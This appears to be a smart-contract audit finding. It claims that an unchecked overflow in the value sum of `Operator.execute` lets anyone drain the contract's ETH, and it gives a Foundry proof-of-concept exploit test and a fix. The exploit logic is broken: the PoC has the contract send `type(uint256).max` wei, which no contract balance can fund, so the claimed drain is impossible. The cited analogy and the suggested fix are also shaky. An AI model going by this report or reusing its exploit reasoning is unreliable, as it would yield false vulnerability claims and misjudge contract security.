### Title
Unchecked `msg.value` conservation overflow in `Operator.execute` drains contract-held ETH - ([File: contracts/Operator.sol](contracts/Operator.sol))

### Summary
`Operator.execute` sums per-call `value` fields inside an `unchecked` block and then requires `msg.value == _sumOfValues`. Because the addition wraps modulo `2^256`, an attacker can craft `calls_` whose individual `value` entries exceed `msg.value` — only the wrapped sum must equal `msg.value`. This is the same bug class as the go-jose integer overflow: an unchecked multiplicative/additive accumulator defeats an integrity check.

### Finding Description
In `Operator.execute`, the value-conservation check is:

```solidity
// contracts/Operator.sol:40-54
uint256 _sumOfValues;
for (uint256 i; i < _length; ) {
    _call = calls_[i];
    uint256 _value = _call.value;
    unchecked {
        _sumOfValues += _value;
    }
    _returnData[i] = _call.target.functionCallWithValue(_call.callData, _value);
    unchecked { ++i; }
}
require(msg.value == _sumOfValues, "value-mismatch");
```

An attacker supplies, e.g., `calls_[0].value = type(uint256).max` and `calls_[1].value = X + 1`, so `_sumOfValues` wraps to `X`. With `msg.value == X` the `require` passes, but `functionCallWithValue` actually sends `2^256 - 1 + X + 1` wei worth of ETH out of the `Operator` contract's own balance. The check that is supposed to guarantee "every wei dispatched was supplied by the caller" is bypassed by arithmetic wraparound — directly analogous to the CBC-HMAC length-field overflow that bypassed authentication in go-jose.

### Impact Explanation
Any ETH held by `Operator` (e.g., ETH pushed into it via `selfdestruct`, accidental sends, or residue from prior executions where a sub-call returned ETH to `Operator`) can be drained by an unprivileged EOA supplying a single `execute` transaction with a wrapping `value` set. The invariant broken is conservation of value across the multicall: `sum(call.value) <= msg.value` is no longer enforced, converting contract-held ETH into attacker-controlled outflows.

### Likelihood Explanation
- `execute` is a public, unprivileged entry point; no governor/keeper role is required.
- The `nonReentrant` guard and `setMsgSender` transient-sender modifier do not constrain `call.value` magnitudes.
- Exploitability requires `Operator` to hold a nonzero ETH balance at execution time; if its balance is zero, the first over-valued `functionCallWithValue` reverts. Attackers can first verify balance on-chain, and users' accidental/forced ETH sends to the contract are capturable by anyone.

### Recommendation
Remove the `unchecked` around `_sumOfValues += _value`, or accumulate in a checked manner so that overflowing sums revert. Alternatively, track `_spent = address(this).balance - balanceBefore` and require `msg.value` covers the actual dispatched value, e.g.:

```solidity
uint256 _balanceBefore = address(this).balance - msg.value;
// ... loop ...
require(address(this).balance >= _balanceBefore, "value-mismatch");
```

### Proof of Concept
Hardhat/Foundry fork sketch:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {Operator, IOperator} from "contracts/Operator.sol";

contract OperatorOverflowTest is Test {
    Operator operator = new Operator();

    function test_sumOverflowDrainsOperatorEth() public {
        // Seed Operator with ETH (e.g., simulating trapped user ETH)
        vm.deal(address(operator), 10 ether);

        IOperator.Call[] memory calls = new IOperator.Call[](2);
        calls[0] = IOperator.Call({
            target: address(this),
            callData: "",
            value: type(uint256).max
        });
        calls[1] = IOperator.Call({
            target: address(this),
            callData: "",
            value: 1 ether + 1
        });
        // wrapped sum = 1 ether, so we only send 1 ether
        operator.execute{value: 1 ether}(calls);

        // Operator's 10 ether is drained; attacker received up to its full balance
        assertLt(address(operator).balance, 10 ether);
    }

    receive() external payable {}
}
```

The `require(msg.value == _sumOfValues)` passes because `type(uint256).max + 1 ether + 1 ≡ 1 ether (mod 2^256)`, while `functionCallWithValue` dispatches value far exceeding `msg.value`.